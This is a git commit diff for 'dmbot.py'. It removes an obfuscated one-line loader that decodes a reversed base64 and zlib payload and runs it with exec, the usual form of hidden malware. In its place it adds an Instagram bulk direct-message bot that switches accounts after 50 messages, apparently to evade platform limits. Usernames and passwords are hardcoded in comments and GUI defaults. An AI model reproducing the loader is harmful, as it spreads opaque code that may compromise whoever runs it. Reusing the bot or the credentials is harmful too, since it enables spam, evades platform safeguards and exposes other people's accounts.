acc52fb0c4f7120190b8c7840f4ab7339278190e
Mofa <43315211+Mofardin@users.noreply.github.com>
2024-03-29 03:27:18 +0100

    Update dmbot.py

--- dmbot.py
+++ dmbot.py
@@ -1,2 +1,225 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+from selenium import webdriver
+from time import sleep
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.common.keys import Keys
+import customtkinter as ctk
+import tkinter as tk
+from tkinter import ttk
+from threading import Thread
+from selenium.common.exceptions import TimeoutException
+import pandas as pd
+import os
+import openpyxl
+import fsspec
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("dark-blue")
 
+
+accs = dict()
+with open("accs.txt", "r") as f:
+    content = f.readlines()
+    content = [line.rstrip('\n') for line in content]
+    for line in content:
+        user,password = line.split()
+        accs[user] = password
+
+#print(accs)
+
+
+#################
+##MAIN FUNCTION##
+#################
+
+def main(user,password):
+    #######################
+    ##GETTING THE BROWSER##
+    #######################
+    browser = webdriver.Chrome()
+    browser.get('https://www.instagram.com')
+
+    #######################################
+    ##ELEMENTS FOR UPDATING IN THE FUTURE##
+    #######################################
+    accept_1 = '//*[text()="Decline optional cookies"]' #third possibility for cookies
+    username_box1 = '//*[@id="loginForm"]/div/div[1]/div/label' #username entry box
+    sleep(1)
+    
+    ##############
+    ##LOGGING IN##
+    ##############
+    WebDriverWait(browser, 5).until(EC.element_to_be_clickable((By.XPATH, accept_1))).click()
+    username_box = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, username_box1)))
+    while True:
+        try:
+            username_box.click()
+            break
+        except:
+            pass
+
+                #1.) slimpsonbart@gmail.com             2.) rankvisionagency
+                #1.) bartolomejjedekrastavce            2.) blonked123
+    username_box.send_keys(user)
+
+    actions = ActionChains(browser)
+    actions = actions.send_keys(Keys.TAB)
+    actions.perform()
+    actions = actions.send_keys(password)
+    actions.perform()
+    actions = actions.send_keys(Keys.ENTER)
+    actions.perform()
+    
+
+    #################
+    ##OPENING INBOX##
+    #################
+    while True:
+        sleep(1)
+        if browser.current_url == r'https://www.instagram.com/accounts/onetap/?next=%2F':
+            browser.get('https://www.instagram.com/direct/inbox/')
+            break
+        else:
+            pass
+
+    #READING EXCEL
+    col = column_option.get()
+    df = pd.read_excel("C://spreadsheets//"+recipients.get(), usecols=col)
+    links = set()
+    for i in df.values:
+        links.add(i[0])
+
+
+
+    #FETCHING DATA (DM-ed)
+
+    with open("dms.txt", "r") as f:
+        lines = f.readlines()
+        dms = [line.rstrip('\n') for line in lines]
+
+    with open("eliminate.txt", "r") as f:
+        lines = f.readlines()
+        elms = [line.rstrip('\n') for line in lines]
+
+    ##################
+    #SENDING MESSAGES#
+    ##################
+    dm_counter = 0
+    for i in links:
+
+        if dm_counter >= 50:
+            for user in accs:
+                password = accs.pop(user)
+                browser.close()
+                return(main(user,password))
+            return(browser.close())
+
+        try:
+            if i in dms or i in elms:
+                continue
+        except TypeError:
+            continue
+        dm = False
+
+        sleep(1)
+        try:
+            browser.get(i)
+        except:
+            continue
+        try:
+            WebDriverWait(browser, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[text()="Message"]'))).click()
+        except TimeoutException:
+            with open("eliminate.txt", "a") as f:
+                f.write(i)
+                f.write("\n")
+            continue
+            
+        while True:
+            if "direct" in browser.current_url:
+                WebDriverWait(browser, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[text()="Message..."]')))
+                msg = message.get('1.0', ctk.END)
+                actions.send_keys(msg)
+                actions.perform()
+                dm = True
+                dm_counter += 1
+                #print(f"dm_counter went up by 1: {dm_counter}, messaged person: {i}")
+                sleep(1)
+                break
+        
+        if dm:
+            with open("dms.txt", "a") as f:
+                f.write(i)
+                f.write("\n")
+        
+            
+
+    #wait before closing
+    sleep(10)
+
+
+##################
+#WRAPPER FUNCTION#
+##################
+t = None
+def wrapper():
+    global t
+    user = list(accs.items())[0][0]
+    password = accs.pop(user)
+    t = Thread(target=main,args=(user,password))
+    t.start()
+
+
+
+
+#######
+##GUI##
+#######
+window = ctk.CTk()
+window.geometry("525x500")
+
+ctk.CTkLabel(window, text="AUTO MESSAGER", font=("helvetica",20,"bold"), text_color="#56A0D3").grid(row=0,column=2,pady=10)
+
+####COLUMN = 0##################################################
+ctk.CTkLabel(window, text="Enter Username:").grid(row=0,column=0,padx=50)
+user_var = ctk.StringVar()
+user_var.set("slimpsonbart@gmail.com")
+user_entry = ctk.CTkEntry(window, textvariable=user_var)
+user_entry.grid(row=1,column=0)
+
+pass_var = ctk.StringVar()
+pass_var.set("bartolomejjedekrastavce")
+ctk.CTkLabel(window, text="Enter Password:").grid(row=2,column=0)
+pass_entry = ctk.CTkEntry(window, textvariable=pass_var)
+pass_entry.grid(row=3,column=0)
+#####################################################################
+
+
+#dropdown
+ctk.CTkLabel(window, text="Recipients:").grid(row=1,column=2)
+options = os.listdir("C:\\spreadsheets")
+
+selected_option = ctk.StringVar()
+selected_option.set(options[0])
+recipients = ctk.CTkOptionMenu(window, variable=selected_option, values= options)
+recipients.grid(row=2,column=2)
+
+ctk.CTkLabel(window,text="Column:").place(x=428,y=49)
+column_option = ctk.StringVar()
+column_option.set("D")
+column_entry = ctk.CTkEntry(window, textvariable=column_option,width=46)
+column_entry.place(x=440,y=76.5)
+
+ctk.CTkLabel(window, text="Message:").grid(row=4,column=2)
+message = ctk.CTkTextbox(window, width=300,height=250)
+message.grid(row=6,column=2)
+
+
+
+
+button = ctk.CTkButton(window, text="SEND",
+                   command=wrapper)
+button.grid(row=7,column=2,pady=10)
+
+
+window.mainloop()
